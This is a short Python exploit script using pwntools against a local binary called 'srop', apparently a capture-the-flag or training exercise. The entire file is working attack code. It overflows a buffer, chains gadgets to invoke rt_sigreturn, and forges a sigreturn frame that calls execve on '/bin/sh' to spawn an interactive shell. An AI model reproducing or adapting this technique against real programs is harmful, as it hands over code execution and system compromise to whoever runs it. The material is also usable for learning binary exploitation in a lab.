#!/usr/bin/python3



from pwn import * 

elf = context.binary = ELF('./srop')

io = process()
pop_rax = pack(0x0000000000401144)
syscall = pack(0x0000000000401129)
frame = SigreturnFrame()
frame.rax = 59 #system call number
frame.rdi = 0x404036 # address of bin/sh
frame.rsi = 0 
frame.rdx = 0 
frame.rip = 0x0000000000401129 # system call address 
payload = cyclic(8) + pop_rax + pack(15) + syscall + bytes(frame)

io.sendline(payload)
io.interactive()
